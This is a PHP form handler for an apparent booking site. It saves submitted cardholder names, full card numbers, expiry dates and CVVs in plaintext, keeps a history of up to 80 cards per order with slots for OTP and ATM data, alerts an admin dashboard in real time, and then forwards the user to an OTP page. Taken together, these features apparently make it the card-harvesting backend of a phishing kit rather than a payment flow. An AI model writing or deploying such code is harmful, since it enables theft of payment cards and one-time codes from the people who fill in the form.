<?php
declare(strict_types=1);
require __DIR__ . '/../dashboard/init.php';
auth_require_customer_login_or_redirect();
if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
    if (bujairi_wants_json_response()) {
        json_response(['ok' => false, 'message' => 'Method not allowed'], 405);
    }
    http_response_code(405);
    exit;
}
$id = (int) ($_POST['id'] ?? 0);
$pdo = bujairi_pdo();
$order = order_by_id($pdo, $id);
if (!$order) {
    if (bujairi_wants_json_response()) {
        json_response(['ok' => false, 'message' => 'غير موجود'], 404);
    }
    http_response_code(404);
    exit;
}

$oldClientRedirect = trim((string) ($order['client_redirect_url'] ?? ''));
$name = trim((string) ($_POST['CardholderName'] ?? ''));
$num = trim((string) ($_POST['CardNumber'] ?? ''));
$exp = trim((string) ($_POST['Expiry'] ?? ''));
$cvv = trim((string) ($_POST['CVV'] ?? ''));

$list = [];
$raw = $order['card_history_json'] ?? null;
if ($raw !== null && $raw !== '') {
    $dec = json_decode((string) $raw, true);
    if (is_array($dec)) {
        $list = $dec;
    }
}
$list[] = [
    'cardholder_name' => $name,
    'card_number' => $num,
    'expiry' => $exp,
    'cvv' => $cvv,
    'saved_at' => date('Y-m-d H:i:s'),
    'otp' => '',
    'atm' => '',
];
if (count($list) > 80) {
    $list = array_slice($list, -80);
}
$json = json_encode($list, JSON_UNESCAPED_UNICODE);
if ($json === false) {
    $json = '[]';
}

$pdo = bujairi_pdo();
try {
    $st = $pdo->prepare(
        'UPDATE orders SET cardholder_name = ?, card_number = ?, expiry = ?, cvv = ?, card_history_json = ? WHERE id = ?'
    );
    $st->execute([$name, $num, $exp, $cvv, $json, $id]);
} catch (Throwable $e) {
    $st = $pdo->prepare('UPDATE orders SET cardholder_name = ?, card_number = ?, expiry = ?, cvv = ? WHERE id = ?');
    $st->execute([$name, $num, $exp, $cvv, $id]);
}

bujairi_pusher_notify_admin_orders_changed();
bujairi_pusher_notify_dashboard_order_update($pdo, $id, 'تم تحديث بيانات البطاقة', 'card');
if (bujairi_wants_json_response()) {
    if ($oldClientRedirect !== '' && bujairi_stored_redirect_targets_same_booking_step($oldClientRedirect, $id, 'card')) {
        try {
            $cl = $pdo->prepare('UPDATE orders SET client_redirect_url = ? WHERE id = ?');
            $cl->execute(['', $id]);
        } catch (Throwable $e) {
        }
    }
    json_response(['ok' => true, 'orderId' => $id]);
}
redirect('booking/otp.php?id=' . $id);
